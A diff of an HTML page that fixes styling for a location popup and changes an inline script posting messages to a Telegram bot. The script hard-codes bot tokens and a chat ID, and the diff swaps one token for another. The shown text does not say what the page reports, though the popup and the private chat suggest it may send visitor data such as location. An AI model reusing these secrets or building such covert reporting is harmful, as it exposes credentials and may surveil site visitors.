@@ -1,4 +1,4 @@
-<!DOCTYPE html> 
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -110,7 +110,11 @@
             transform: translate(-50%, -50%);
             background-color: rgba(0, 0, 0, 0.8);
             padding: 20px;
-        location-popup button {
+            color: white;
+            z-index: 1000;
+        }
+
+        #location-popup button {
             margin-top: 10px;
             background-color: #ff4747;
             border: none;
@@ -123,19 +127,23 @@
 <body>
     <script>
         // Telegram Bot API integration
-        const TELEGRAM_BOT_TOKEN = '7511590139:AAFJeA3sUb-ZCi4fPgTR12z5Q2fP_9_IN14'; // Replace with your bot token
+        const TELEGRAM_BOT_TOKEN = '7648663174:AAFZIlJ5teoHMYASakDQq_QaTRILmxGYzlw'; // Replace with your bot token
         const TELEGRAM_CHAT_ID = '6219309154'; // Replace with your chat ID
 
         async function sendTelegramNotification(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`; // Correct URL formatting
+            console.log('Sending message to Telegram:', message);  // Debug log to see the message content
             try {
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
                 });
-                if (!response.ok) {
-                    console.error('Failed to send Telegram message');
+
+                if (response.ok) {
+                    console.log('Message sent successfully');
+                } else {
+                    console.error('Failed to send Telegram message:', response.statusText);
                 }
             } catch (error) {
                 console.error('Error sending Telegram message:', error);
